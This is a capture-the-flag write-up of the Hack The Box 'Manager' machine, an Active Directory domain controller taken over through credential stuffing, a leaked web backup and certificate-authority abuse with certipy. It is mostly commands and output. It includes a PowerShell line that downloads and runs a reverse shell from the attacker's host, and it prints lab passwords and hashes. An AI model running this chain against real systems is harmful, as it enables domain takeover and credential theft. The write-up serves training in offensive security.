# HTB - Manager

### TL;DR


__Keywords:__<br>
<br>

__References:__<br>

<br>
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-21 16:51 EDT
Nmap scan report for manager.htb (10.129.142.151)
Host is up, received user-set (0.32s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack
80/tcp    open  http           syn-ack
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
636/tcp   open  ldapssl        syn-ack
1433/tcp  open  ms-sql-s       syn-ack
3268/tcp  open  ldap           syn-ack
5985/tcp  open  wsman          syn-ack
9389/tcp  open  adws           syn-ack
49667/tcp open  unknown        syn-ack
49677/tcp open  unknown        syn-ack
49678/tcp open  unknown        syn-ack
49679/tcp open  unknown        syn-ack
50489/tcp open  unknown        syn-ack
50568/tcp open  unknown        syn-ack
65495/tcp open  unknown        syn-ack

Nmap done: 1 IP address (1 host up) scanned in 1379.15 seconds
```
Enumerate open ports
```markdown
nmap $target -p53,80,88,135,139,389,445,464,593,636,1433,3268,5985,9389 -sV -sC -Pn    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-21 17:29 EDT
Nmap scan report for manager.htb (10.129.142.151)
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-22 04:33:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T04:34:13+00:00; +7h03m31s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T04:34:12+00:00; +7h03m30s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-20T17:45:32
|_Not valid after:  2053-10-20T17:45:32
|_ssl-date: 2023-10-22T04:34:13+00:00; +7h03m31s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-22T04:34:13+00:00; +7h03m31s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h03m30s, deviation: 1s, median: 7h03m30s
| smb2-time: 
|   date: 2023-10-22T04:33:32
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 55.72 seconds

```
SMB enumeration.
```markdown
smbmap -H <target ip> -u guest
[+] IP: 10.129.142.151:445      Name: manager.htb
  Disk                          Permissions     Comment
  ----                          -----------     -------
  ADMIN$                        NO ACCESS       Remote Admin
  C$                            NO ACCESS       Default share
  IPC$                          READ ONLY       Remote IPC
  NETLOGON                      NO ACCESS       Logon server share 
  SYSVOL                        NO ACCESS       Logon server share 
```<br>
<br>
### PHASE 2. User
Attempt a rid bruteforce.
```markdown
> crackmapexec smb manager.htb -u guest -p '' --rid-brute
SMB         10.129.142.151  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.142.151  445    DC01             [+] manager.htb\guest: 
SMB         10.129.142.151  445    DC01             [+] Brute forcing RIDs
SMB         10.129.142.151  445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.142.151  445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.142.151  445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.142.151  445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.142.151  445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.142.151  445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.142.151  445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.142.151  445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.142.151  445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.142.151  445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.142.151  445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.142.151  445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.142.151  445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.142.151  445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.142.151  445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.142.151  445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.142.151  445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.142.151  445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.142.151  445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.142.151  445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.142.151  445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.142.151  445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.142.151  445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.142.151  445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.142.151  445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.142.151  445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.142.151  445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.142.151  445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.142.151  445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.142.151  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.142.151  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.142.151  445    DC01             1119: MANAGER\Operator (SidTypeUser)

![manager1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f1f2c56e-9f75-4173-911c-a20431b38b86)

Copy domain users found to a file called `output` and generate a wordlist of users/passwords.
```markdown
> echo "MANAGER\Zhong (SidTypeUser)                     
SMB         10.129.142.151  445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.142.151  445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.142.151  445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.142.151  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.142.151  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.142.151  445    DC01             1119: MANAGER\Operator (SidTypeUser)" > output

> cat output | cut -d \\ -f 2 | awk -F ' ' {'print $1}' | tr '[:upper:]' '[:lower:]' > wordlist

> cat wordlist
zhong
cheng
ryan
raven
jinwoo
chinhae
operator
```

![manager2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/df63b4dc-42f3-413f-8774-b6d8771191ed)

Next, attempt a credential stuffing attack in the mssql database using this wordlist.
```markdown
crackmapexec mssql manager.htb -u ./wordlist -p ./wordlist
```
Attack is successful for credentials `operator:operator`

![manager3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/24859b0f-2727-49d4-a063-cc318dade2ef)

Login with credentials and start enumerating the database.
```markdown
> python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py manager.htb/operator:operator@10.129.142.151 -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
> SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
> SQL> enable_xp_cmdshell
[-] ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```
So `xp_cmdshell` is not enabled and we don't have permissions to activate so this way is closed. We can also try to cmpture the ntlmv2 hash with `responder` or `smbserver.py` + `xp_dirtree`
The captured hash is.
```markdown
[*] DC01$::MANAGER:aaaaaaaaaaaaaaaa:d063ef67f8a1adf0d8368e4438f744db:0101000000000000809a7d8dbd04da01a9e4c3054b7505c100000000010010004200470051006400540074006800640003001000420047005100640054007400680064000200100050005a005800780059005600670041000400100050005a0058007800590056006700410007000800809a7d8dbd04da0106000400020000000800300030000000000000000000000000300000489aaa814b1c641c0613cb01649cab0b0c5aadd6d67823781f76634d0d773dec0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360039000000000000000000
```
Not crackable with hashcat though.
Since we can at least explore the file system with `xp_dirtree`, let's list the contents of `webroot` folder.
```markdown
> SQL> exec xp_dirtree 'c:\inetpub',1,1
subdirectory                                                                depth          file   
-----------------------------------------------  ---------------------   -----------   -----------

custerr                                                                       1             0   
history                                                                       1             0   
logs                                                                          1             0   
temp                                                                          1             0   
wwwroot                                                                       1             0   

> SQL> exec xp_dirtree 'c:\inetpub\wwwroot',1,1
subdirectory                                                                 depth          file   
----------------------------------------------------------------------   -----------   -----------   

about.html                                                                    1             1   
contact.html                                                                  1             1   
css                                                                           1             0   
images                                                                        1             0   
index.html                                                                    1             1   
js                                                                            1             0   
service.html                                                                  1             1   
web.config                                                                    1             1   
website-backup-27-07-23-old.zip                                               1             1   
``
Ìt seems someone made a backup of the site on july and forgot a copy of the file in the webroot folder. This can be downloaded using a browser or wget.
```markdown
wget http://manager.htb/website-backup-27-07-23-old.zip -O backup.zip
```
Opening the `.zip` file, we find a `.xml` with credentials.

![manager4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/fa59df58-80fd-45a8-b36d-4c1ab9174d5d)

We use them to log in with evil-winrm.
```markdown
evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123'  -i 10.129.142.151
```
This shell allows us to collect `user.txt`
<br>
<br>
### PHASE 3. System
First step is to upgrade the shell to a nishang interactive shell.
```markdown
powershell "iex(new-object net.webclient).downloadstring('http://10.10.14.69/Invoke-PowerShellTcp.ps1')"
```
Next, enumerate the system from the powershell.
```powershell
get-computerinfo
WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
WindowsCurrentVersion                                   : 6.3
WindowsProductName                                      : Windows Server 2019 Standard
WindowsVersion                                          : 1809
```
Enumerate principal rights with `certify.exe`

![manager5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/07a54637-4a5a-4ac5-adbf-0cbfcdc83654)

It seems user raven has privileges to manageCA. A walkthrough to exploit this vulnerability can be found here: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2
First step is to grant yourself the Manage Certificates access right by adding your user as a new officer.
```markdown
/usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.142.151 -add-officer raven

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```
The SubCA template can be enabled on the CA with the `-enable-template parameter`. By default, the SubCA template is enabled.
```markdown
/usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```
We start by requesting a certificate based on the SubCA template. This request will be denied, but we will save the private key and note down the request ID. make sure you are running the command from a directory where you have writing rights, otherwise the `.key` will not be written.
```markdown
/usr/bin/certipy-ad req -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -target manager.htb -template SubCA -upn administrator@manager.htb

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 21
Would you like to save the private key? (y/N) y
[*] Saved private key to 21.key
[-] Failed to request certificate# we can then issue the failed certificate request with the ca command and the -issue-request <request ID> parameter
/usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -issue-request 21 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

[*] Successfully issued certificate
```
In this case, private key is saved as `21.key`. Next, retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.
```markdown
/usr/bin/certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 21
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 21
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '21.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
We can use this certificate to obtain a tgt ticket with `certipy`. This is known as a pass-the-certificate attack (https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate).
In order for this to work, synchronization with dc clock is needed to avoid clock skew too great. This can be done with ntpdate
```markdown
sudo ntpdate -u 10.129.142.151
2023-10-22 16:28:37.84492 (-0400) +25184.364655 +/- 0.061746 10.129.142.151 s1 no-leap
CLOCK: time stepped by 25184.364655
```
Using the administrator certificate that we have just created, generate a kerberos tgt ticket.
```markdown
/usr/bin/certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.129.142.151 -username administrator -domain manager.htb

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
At this point, you can have a full interactive system shell either passing the administrator hash or passing the tgt ticket.
To pass the hash, you can use `psexec` or similar tool. To pass the ticket, first export the ticket to prepare a pass the ticket attack.
```markdown
export KRB5CCNAME=administrator.ccache
```
Then login to dc using passing the tgt ticket.
```markdown
python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.129.142.151 -target-ip 10.129.142.151

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.129.142.151.....
[*] Found writable share ADMIN$
[*] Uploading file pxXDoAzA.exe
[*] Opening SVCManager on 10.129.142.151.....
[*] Creating service CRFB on 10.129.142.151.....
[*] Starting service CRFB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd c:\users\administrator\desktop
 
c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 566E-8ECA

 Directory of c:\Users\Administrator\Desktop

09/28/2023  02:27 PM    <DIR>          .
09/28/2023  02:27 PM    <DIR>          ..
10/20/2023  10:46 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,414,751,744 bytes free
```
Final note: for some reason the dc clock gets unskewed very easily, for this reason the commands after the `ntpdate` have to be issued very quick to avoid clocks get unsynchronized. Have them typed elsewhere to quickly copy-paste them.

